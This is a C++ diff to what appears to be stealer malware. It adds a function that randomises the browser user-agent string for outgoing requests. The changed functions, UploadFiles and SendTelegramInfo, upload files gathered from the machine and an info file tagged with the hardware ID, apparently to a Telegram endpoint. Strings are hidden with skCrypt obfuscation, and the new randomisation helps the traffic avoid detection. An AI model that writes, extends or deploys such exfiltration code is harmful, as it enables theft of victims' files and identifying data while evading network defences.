@@ -148,6 +148,13 @@ string GenerateRandom(const int len) {
     return result;
 }
 
+string GetRandomUserAgent() {
+    timeval time;
+    GetTimeOfDay(&time, NULL);
+    srand((time.tv_sec * 2654435789U + time.tv_usec) * 2654435789U + _getpid());
+    return userAgents[rand() % (end(userAgents) - begin(userAgents))];
+}
+
 vector<string> GetFiles(const string& mainDir) {
     vector<string> result;
 
@@ -569,7 +576,9 @@ void UploadFiles(const vector<string>& files) {
         string header = (string)skCrypt("Content-Type: multipart/form-data; boundary=") + boundary;
         string beggining = (string)skCrypt("--") + boundary + (string)skCrypt("\r\nContent-Disposition: form-data; name=\"file\"; filename=\"") + Split(file, '\\').back() + (string)skCrypt("\"\r\nContent-Type: application/octet-stream\r\n\r\n");
         string ending = (string)skCrypt("\r\n--") + boundary + (string)skCrypt("--\r\n");
-        string userAgent = (string)skCrypt("Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36,gzip(gfe)");
+        string userAgent = userAgents[0];
+        if (RANDOM_USERAGENT)
+            userAgent = GetRandomUserAgent();
 
         ifstream rFile(file, ios::in);
         stringstream buffer;
@@ -913,8 +922,9 @@ void SendTelegramInfo() {
         (string)skCrypt("\r\n--") + boundary + (string)skCrypt("\r\nContent-Disposition: form-data; name=\"caption\"\r\n\r\n") + GetHWID() +
         (string)skCrypt("\r\n--") + boundary + (string)skCrypt("\r\nContent-Disposition: form-data; name=\"document\"; filename=\"") + Split(INFOFILE, '\\').back() + (string)skCrypt("\"\r\nContent-Type: text/plain\r\n\r\n");
     string ending = (string)skCrypt("\r\n--") + boundary + (string)skCrypt("--\r\n");
-    string userAgent = (string)skCrypt("Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36,gzip(gfe)");
-
+    string userAgent = userAgents[0];
+    if (RANDOM_USERAGENT)
+        userAgent = GetRandomUserAgent();
 
     ifstream rFile(INFOFILE, ios::in);
     stringstream buffer;
